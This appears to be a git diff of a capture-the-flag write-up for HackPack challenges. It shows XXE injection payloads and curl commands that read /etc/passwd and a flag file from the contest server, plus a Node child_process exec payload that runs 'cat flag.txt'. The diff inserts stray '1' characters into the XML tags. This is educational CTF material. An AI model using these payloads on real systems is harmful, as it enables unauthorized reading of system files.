@@ -33,11 +33,15 @@ parent.postMessage(window.location.toString(),"*");var originalAlert=window.aler
 Inspect the site and, in the console section, write: flag=atob("ZmxhZ3t4NTVfaTVOdF83aEE3X2JBRF9SMUdoNz99") -> "flag{x55_i5Nt_7hA7_bAD_R1Gh7?}"
 
 - Custom UI: Inserting '<', we get "Warning: DOMDocument::loadXML():". This is a [XML External Entity Injection](https://portswigger.net/web-security/xxe).
-We see that there is a xdata variable, so we can inject here our data. xdata: <button><color> mn</color><value></value></button>
-Injection: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><button><color>&xxe;</color><value>iii</value></button>
-
-[URL encoded](https://www.urlencoder.org/): %3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxe%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e
-
+We see that there is a xdata variable, so we can inject here our data. xdata: <1button><1color> mn<1/color><1value><1/value><1/button>
+Injection: 
+```
+<1!DOCTYPE foo [<1!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><1button><1color>&xxe;<1/color><1value>iii<1/value><1/button>
+```
+[URL encoded](https://www.urlencoder.org/): 
+```
+%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxe%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e
+```
 ```
 curl "https://custom-ui.cha.hackpack.club/" -d xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxe%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e
 ```
@@ -52,18 +56,22 @@ curl "https://custom-ui.cha.hackpack.club/" -d xdata=%3c!DOCTYPE%20foo%20[%3c!EN
 ...
 
 ```
-Injection: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/flag.txt"> ]><button><color>&xxe;</color><value>iii</value></button>
-
+Injection: 
+```
+<1!DOCTYPE foo [<1!ENTITY xxe SYSTEM "file:///etc/flag.txt"> ]><1button><1color>&xxe;<1/color><1value>iii<1/value><1/button>
+```
 ```
 curl "https://custom-ui.cha.hackpack.club/" -d xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fflag.txt%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxe%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e -v --cookie "debug=true"
 ```
-
 And we get the flag.
 
 ## PWN 
-- Jsclean: the python file is asking for a js file and a js code. In the python script we can see that it refers to index.js, so we know that this is the file to clean: index.js and the js code is: require("child_process").exec("cat flag.txt", function(error, stdout, stderr){console.log(stdout);});
+- Jsclean: the python file is asking for a js file and a js code. In the python script we can see that it refers to index.js, so we know that this is the file to clean: index.js and the js code is: 
+´´´
+require("child_process").exec("cat flag.txt", function(error, stdout, stderr){console.log(stdout);});
+´´´
 
 ## Misc
-- Soundy: using a sstv decoder
--Listen up!: when we use the exiftool command, we get a comment with an [URL](https://www.youtube.com/watch?v=2xZgCVG_Bzk) about MS Paint EXE file.
-We need to convert the audio to RAW format (it is the uncompressed audio).
+- Soundy: using a sstv decoder.
+![]({{ site.baseurl }}/images/HackPack-sstv.jpeg)
+-Listen up!: when we use the exiftool command, we get a comment with an [URL](https://www.youtube.com/watch?v=2xZgCVG_Bzk) about MS Paint EXE file. We need to convert the audio to RAW format (it is the uncompressed audio).
